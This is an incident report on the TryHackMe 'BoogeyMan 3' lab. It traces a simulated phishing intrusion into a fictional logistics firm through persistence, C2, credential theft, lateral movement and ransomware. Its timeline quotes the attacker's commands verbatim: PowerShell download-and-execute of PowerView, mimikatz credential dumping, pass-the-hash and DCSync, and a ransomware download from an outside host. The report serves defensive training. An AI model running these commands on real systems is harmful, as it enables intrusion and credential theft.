# Incident Report — BoogeyMan 3

**Author:** Aditya Gupta • **Date:** 09/14/2025 • **Room:** [BoogeyMan 3](https://tryhackme.com/room/boogeyman3)
**Severity:** Critical • **Status:** In Progress

---

## Executive Summary

On Aug 29, 2023 @ 20:51:15.856, Evan Hutchinson, CEO, opened up a malicious attachment frmo a phishing email from a compromised user account of Allie Sierra. This caused attachment contained malicious commands, where the attacker was able to execute files, create a command and control connection, and create scheduled tasks. With the C2 connection, the attacker was able to enumerate user accounts, computer objects, and files. Along with this, the attacker downloaded exploitation software `mimikatz` to dump account credentials, perform lateral movement, and exfiltrate a file. Finally, the attacker downloaded and executed ransomwware.

At this point, the security team is in progress to revert the system and files back to a working state, rotate account credentials, and block adversaries.

---

## TL;DR

A phishing email sent by a compromised account of Allie Sierra (`allie.sierra@quicklogistics.org`), to Evan Hutchinson (`evan.hutchinson`), CEO of the company. Evan clicked on a malicious attachment `ProjectFinancialSummary_Q3.pdf.hta`. The attacker established persistance by created scheduled tasks and initiating a C2 connection (`165.232.170.151:80`). The attacker also bypassed UAC and dumped credentials by downloading and using `mimikatz`. The attacker then performed lateral movement by using pass-the-hash attack, to various accounts such as `itadmin`, `allan.smith`, and `Administrator`. Finally, the attacker downloaded and executed a `ransomboogey.exe` ransomware file. Security is working to revert system back to its original state, rotate account credentails, and block IOCs.

---

## Overview

- **Initial alert / source:** Phishing email report, SOC Triage
- **Short description:** `evan.hutchinson`, CEO, reported the phishing email after downloading a malicious attachment and opening it. Suspicious email was sent by a compromised employee account `allie.sierra`
- **Affected host(s):** (WKSTN-0051.quicklogistics.org, 10.10.155.159, evan.hutchinson), (allie.sierra)

---

## Scope & Impact

- **Systems impacted:** `WKSTN-0051.quicklogistics.org`, `WKSTN-1327.quicklogistics.org`, `DC01.quicklogistics.org`
- **Data / risk:** Persistence through scheduled task, C2 connection, exfiltration of user accounts names, LSASS secrets from LSASS memory, `allan.smith`'s password, password hashes (`itadmin`, `administrator`, `backupda`), ransomware risk.
- **Business impact:** Major - Credentials of high-profile roles were exploited and ransomware executed.

---

## Timeline

| Time | User | Action | Command |
| --- | --- | --- | --- |
| Aug 29, 2023 @ 20:51:15.856 | `evan.hutchinson` | Evan Hutchinson opens `ProjectFinancialSummary_Q3.pdf` from attachment | - |
| Aug 29, 2023 @ 23:51:15.856 | `evan.hutchinson` | `ProjectFinancialSummary_Q3.pdf.hta` gets opened by `mshta.exe`. Spawns children processes | - |
| Aug 29, 2023 @ 23:51:16.738 | `evan.hutchinson` | Stage 1 payload implants a file to another location | `"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat` |
| Aug 29, 2023 @ 23:51:16.771 | `evan.hutchinson` | `review.dat` file gets executed | `"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer` |
| Aug 29, 2023 @ 23:51:16.809 | `evan.hutchinson` | Stage 1 payload establishes a persistence mechanism by creating scheduled task | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;` |
| Aug 29, 2023 @ 23:51:17.910 | `evan.hutchinson` | C2 connection established to `165.232.170.151:80` by `review.dat` | - |
| Aug 29, 2023 @ 23:53:47.951 | `evan.hutchinson` | attacker performs enumeration commands | `whoami` |
| Aug 29, 2023 @ 23:54:49.043 | `evan.hutchinson` | Attacker bypasses UAC | `fodhelper.exe` |
| Aug 30, 2023 @ 00:06:38.162 | `evan.hutchinson` | Attacker downloads enumeration tool and performs enumeration of domain computer objects | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainComputer"` |
| Aug 30, 2023 @ 00:09:23.529 | `evan.hutchinson` | attacker downloads enumeration tool and performs enumeration of all user accounts in domain (AD) | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainUser"` |
| Aug 30, 2023 @ 00:09:57.186 | `evan.hutchinson` | Attacker downloads mimikatz | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip"` |
| Aug 30, 2023 @ 00:10:15.314 | `evan.hutchinson` | Attacker extract mimikatz | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "Expand-Archive mimi.zip"` |
| Aug 30, 2023 @ 00:11:26.438 | `evan.hutchinson` | Attackers attempts to dump credentials | `"C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe" privilege::debug sekurlsa::logonpasswords exit` |
| Aug 30, 2023 @ 00:13:37.090 | `evan.hutchinson` | Attacker performs lateral movement (Pass-the-Hash via Mimikatz) | `"C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS /ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe" exit` |
| Aug 30, 2023 @ 00:14:36.078 | `evan.hutchinson` | Attacker downloads enumeration tool and performs enumeration of SMB shares across domain | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Invoke-ShareFinder"` |
| Aug 30, 2023 @ 00:19:52.889 | `evan.hutchinson` | attacker accesses file | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "cat FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1"` |
| Aug 30, 2023 @ 00:20:23.384 | `evan.hutchinson` | attacker performs lateral movement | ``C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, -c, $credential = (New-Object PSCredential -ArgumentList (, QUICKLOGISTICS\allan.smith, (ConvertTo-SecureString Tr!ckyP@ssw0rd987 -AsPlainText -Force))) ; Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}`` |
| Aug 30, 2023 @ 00:20:59.718 | `allan.smith` | Attacker performs enumeration/recon | `"C:\Windows\system32\whoami.exe"` |
| Aug 30, 2023 @ 01:29:09.409 | `allan.smith` | Attacker downloads `mimikatz` | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip"` |
| Aug 30, 2023 @ 01:30:25.545 | `allan.smith` | Attacker performs lateral movement | `"C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS /ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe" exit` |
| Aug 30, 2023 @ 01:30:51.647 | `allan.smith` | Attacker dumps credentials | `"C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe" privilege::debug sekurlsa::logonpasswords exit` |
| Aug 30, 2023 @ 01:31:39.366 | `allan.smith` | Attacker performs lateral movement | `"C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:administrator /domain:QUICKLOGISTICS /ntlm:00f80f2538dcb54e7adc715c0e7091ec /run:powershell.exe" exit` |
| Aug 30, 2023 @ 01:46:18.577 | `Administrator` | Attacker downloads `mimikatz` | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip"` |
| Aug 30, 2023 @ 01:47:34.171 | `Administrator` | Attacker enumerates | `"C:\Windows\system32\net.exe" localgroup administrators` |
| Aug 30, 2023 @ 01:47:57.809 | `Administrator` | Attacker dumps hashes of `backupda` account via DCSync attack | `"C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe" "lsadump::dcsync /domain:quicklogistics.org /user:backupda" exit` |
| Aug 30, 2023 @ 01:53:13.738 | `Administrator` | Attacker downloads ransomware file | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe"` |
| Aug 30, 2023 @ 01:53:33.815 | `Administrator` | Attacker executes ransomware file | `"C:\Users\Administrator\ransomboogey.exe"` |

---

## Indicators of Compromise (IOCs)

- **Domains / URLs:**
  - `https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip`
  - `https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1`
  - `http://ff.sillytechninja.io/ransomboogey.exe`  
- **IPs:**
  - `Host/Source IP: 10.10.155.159`
  - `C2: 165.232.170.151:80`
- **File hashes:**
  - `mimikatz SHA256:908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53`
  - `ransomboogey.exe SHA256:18158ede3f2892862cf2895e20b1495f7034f04fd63a36abfe8c944063617ab3`
  - `PowerView.ps1 SHA256:908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53`
- **Commands / processes:**
  - `xcopy.exe`
  - `Register-ScheduledTask Review -InputObject $D -Force`
  - `fodhelper.exe`
  - `whoami`
  - `mimikatz.exe` (various)
  - `net.exe localgroup administrators`
  - `ransomboogey.exe`
- **User accounts / services:**
  - `QUICKLOGISTICS\evan.hutchinson`
  - `QUICKLOGISTICS\itadmin`
  - `QUICKLOGISTICS\allan.smith`
  - `QUICKLOGISTICS\Administrator`

---

## Evidence & Artifacts

- Winlog logs through winlogbeat

---

## Analysis & Findings

- **Triage commands used:** N/A
- **Network analysis:**
  - Outbound traffic to `165.232.170.151` in C2 connection
  - tools downloaded and used such as `mimikatz`, `PowerView`, `ransomboogey`
- **Host analysis:**
  - usage of `whoami`, `net`, `fodhelper`, `mimikatz`
  - persistance established using scheduled tasks and C2 connection
  - outputting (`cat`) of proprietary `IT_Automation.ps1` file
- **MITRE ATT&CK mapping:**
  
  | Attack ID | Attack Name | Notes |
  | --- | --- | --- |
  | [`T1566.001`](https://attack.mitre.org/techniques/T1566/001/) | Spearphishing Attachment | Carefully crafted email sent to CEO with malicious attachment |
  | [`T1218.005`](https://attack.mitre.org/techniques/T1218/005/) | System Binary Proxy Execution: Mshta | `mshta.exe` opened `.hta` attachment |
  | [`T1218.011`](https://attack.mitre.org/techniques/T1218/011/) | System Binary Proxy Execution: Rundll32 | `rundll32.exe` executed `review.dat` |
  | [`T1053.005`](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task/Job: Scheduled Task | Attacker created a scheduled task `Review` |
  | [`T1033`](https://attack.mitre.org/techniques/T1033/) | System Owner/User Discovery | Adversary ran commands like `whoami` and `net` |
  | [`T1059.001`](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | Used powershell scripts to download tools |
  | [`T1003.001`](https://attack.mitre.org/techniques/T1003/001/) | OS Credential Dumping: LSASS Memory | `...mimikatz.exe privilege::debug sekurlsa::logonpasswords exit` |
  | [`T1003.006`](https://attack.mitre.org/techniques/T1003/006/) | OS Credential Dumping: DCSync | Attacker ran `...mimikatz.exe" "lsadump::dcsync /domain:quicklogistics.org ...` |
  | [`T1550.002`](https://attack.mitre.org/techniques/T1550/002/) | Use Alternate Authentication Material: Pass the Hash | Attacker used hash values for authentication |
  | [`T1071`](https://attack.mitre.org/techniques/T1071/) | Application Layer Protocol | Adversary communicated with external C2 server |
  | [`T1041`](https://attack.mitre.org/techniques/T1041/) | Exfiltration Over C2 Channel | Adversary output contents of `IT_Automation.ps1` |
  | [`T1548.002`](https://attack.mitre.org/techniques/T1548/002/) | Abuse Elevation Control Mechanism: Bypass User Account Control | Adversary used `fodhelper.exe` |
  | [`T1486`](https://attack.mitre.org/techniques/T1486/) | Data Encrypted for Impact | Adversary used `ransomboogey.exe` to encrypt data |

- **Summary conclusion:** Attacker gained access to `WKSTN-0051.quicklogistics.org` by spearphishing email to Evan Hutchinson. Attacker was able to set up a C2 connection, download malware, dump credentials, and move laterally. Attacker finally downloaded and executed a ransomware file. The extent of the ransomware is currently unknown.

---

## Remediation & Mitigation

- **Immediate:**
  - isolate infected hosts: `WKSTN-0051.quicklogistics.org`, `WKSTN-1327.quicklogistics.org`, `DC01.quicklogistics.org`
  - reset passwords for users: `evan.hutchinson`, `allan.smith`, `itadmin`, `Administrator`
  - block IP: `165.232.170.151:80`
  - block domain: `ff.sillytechninja.io`
  - reset system back to original state to fight ransomware
- **Follow-up:** (patching, IDS/EDR tuning, hardening)
  - Tune IDS to better flag malicious activity (Powershell, recon commands, mimikatz)
  - Train employees on phishing emails/attachments
- **Validation:** (steps taken to confirm containment)  
  - verified no traffic to malicious IP
  - verified no traces of downloaded software
  - re-imaged infected workstations to revert back to original state

---

## Lessons Learned

- IDS needs to be tuned to alert suspicious activity early
- IDS and Firewall need to be configured to detect access to malware like `mimikatz`
  - detect large amounts of traffic to unknown IP
- ELK performed well for investigation
- Good level of logging being done - able to piece together the story in ELK

## Appendix

References:

- [MITRE Attack Matrix](https://attack.mitre.org/)
- [TryHackMe Boogeyman 3 Room](https://tryhackme.com/room/boogeyman3)
